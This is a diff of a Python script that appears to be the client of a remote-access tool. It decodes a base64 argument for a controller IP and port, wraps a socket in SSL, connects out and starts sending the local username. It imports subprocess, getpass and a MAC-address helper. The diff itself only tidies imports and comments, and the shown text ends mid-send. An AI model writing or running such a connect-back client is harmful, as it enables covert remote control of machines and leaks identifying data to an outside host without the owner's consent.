@@ -1,24 +1,15 @@
-#!/usr/bin/python
+#!/usr/bin/python3
+import json, os, base64, sys, socket, ssl, getpass, subprocess
 from uuid import getnode as get_mac
-import json
-import os
-import base64
-import sys
-import socket
-import ssl
-import getpass
-import subprocess
 from os.path import expanduser
+
 home = expanduser("~")
 os.chdir(home)
-# setup
 args = json.loads(base64.b64decode(sys.argv[1]))
 host, port = args['ip'], int(args['port'])
-# Connect
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock = ssl.wrap_socket(s)
 sock.connect((host, port))
-# Send computer name
 username = getpass.getuser()
 sock.send(json.dumps({
     "username": username,
